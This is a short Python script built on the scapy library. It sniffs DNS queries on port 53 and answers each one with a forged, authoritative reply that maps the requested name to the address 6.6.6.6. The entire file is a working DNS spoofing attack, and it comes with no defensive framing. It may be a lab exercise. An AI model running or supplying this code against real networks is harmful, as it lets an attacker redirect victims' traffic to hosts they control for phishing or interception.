from scapy.all import *

# Process each packet that captured by show it.
def process_packet(packet):
	if DNSQR in packet:
		ip  = IP(dst= packet[IP].src, src = packet[IP].dst) # The opposite IP packet.
		udp = UDP(dport = packet[UDP].sport, sport = packet[UDP].dport) # Building the UDP opposite packet.
		ans = DNSRR(rrname = packet[DNS].qd.qname , ttl = 1000, rdata = '6.6.6.6')
		dns = DNS(id = packet[DNS].id, qr = 1, aa=1, qd= packet[DNS].qd, an = ans)
		replay = ip/udp/dns
		print("\033[91mPACKET CAPTURED!\nThe response is:\033[0m")
		replay.show()
		send(replay)

sniff(filter = 'dst port 53',prn= process_packet)



